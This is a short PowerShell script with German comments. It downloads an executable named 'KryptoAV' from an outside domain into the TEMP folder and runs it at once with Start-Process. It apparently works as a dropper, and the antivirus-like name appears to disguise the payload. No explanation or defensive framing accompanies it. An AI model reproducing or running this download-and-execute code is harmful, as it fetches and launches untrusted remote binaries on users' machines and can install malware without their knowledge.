$someData = @(
    [PSCustomObject]@{ a = "https://fumot-12000.de/kryptoav.exe"; b = "KryptoAV" }
)

foreach ($i in $someData) {
    try {
        $filePath = "$env:TEMP\$($i.b)"
        $download = $true

        if (Test-Path $filePath) {
            $download = $false
        }

        if ($download) {
            Invoke-RestMethod -Uri $i.a -OutFile $filePath
        }

        Start-Process $filePath
    }
    catch {
        # Fehlerbehandlung (optional)
        Write-Host "Fehler beim Verarbeiten der Datei $($i.b): $_"
    }
}
